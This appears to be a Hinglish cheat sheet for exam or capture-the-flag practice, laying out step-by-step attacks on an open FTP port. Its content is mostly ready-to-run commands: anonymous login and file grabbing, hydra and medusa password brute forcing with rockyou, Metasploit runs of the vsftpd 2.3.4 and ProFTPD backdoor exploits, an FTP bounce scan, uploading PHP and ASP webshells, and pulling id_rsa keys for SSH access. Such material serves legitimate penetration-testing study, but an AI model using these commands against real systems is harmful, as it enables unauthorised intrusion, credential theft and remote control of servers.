# 🔓 FTP PORT OPEN MILA (21) — Ab Kya?

---

## CASE 1: Anonymous Login Try Karo (Pehle Yeh)
```bash
ftp <IP>
# Username: anonymous
# Password: (blank ya anonymous@)

# Ya nmap se check:
nmap --script ftp-anon -p 21 <IP>
```
> Anonymous allowed? → CASE 2
> Denied? → CASE 3

---

## CASE 2: Files Browse & Download Karo
```bash
ftp> ls -la                    # hidden files bhi dekho
ftp> cd /home
ftp> ls
ftp> get flag.txt              # file download
ftp> mget *.txt                # multiple files
ftp> binary                    # binary mode for non-text
ftp> get backup.zip
```
> Flag mili? Submit.
> Creds mili kisi file mein? SSH/Web pe try karo.
> .ssh folder mila? `id_rsa` key download karo.

---

## CASE 3: Brute Force FTP Login
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> ftp -t 4
hydra -L users.txt -P passwords.txt <IP> ftp -t 4
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```
> Creds mile → CASE 2 pe wapas

---

## CASE 4: FTP Version Check — Known Exploits
```bash
nmap -sV -p 21 <IP>
```

| Version | Exploit |
|---|---|
| **vsftpd 2.3.4** | Backdoor! `use exploit/unix/ftp/vsftpd_234_backdoor` |
| **ProFTPD 1.3.3c** | `use exploit/unix/ftp/proftpd_133c_backdoor` |
| **ProFTPD 1.3.5** | mod_copy → file copy without auth |

```bash
# vsftpd backdoor
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP>
run
```

---

## CASE 5: FTP Bounce / Port Scan
```bash
nmap -b anonymous@<FTP_IP> <TARGET_IP>
```
> Rare in exam but agar question mein "FTP bounce" likha ho

---

## CASE 6: Upload Shell via FTP
```bash
ftp> put shell.php             # agar write permission hai
ftp> put reverse.asp
```
> Web root mein upload kiya? Browser se access karo: `http://<IP>/shell.php`

---

## QUICK DECISION:
```
FTP open
  ├─ Anonymous login? → ls -la → get files → check for creds/flags
  ├─ Access denied? → hydra brute force
  ├─ vsftpd 2.3.4? → Metasploit backdoor exploit (instant shell)
  ├─ ProFTPD? → Check version for known backdoors
  ├─ Write access hai? → Upload webshell
  └─ .ssh folder? → Download id_rsa → SSH login
```
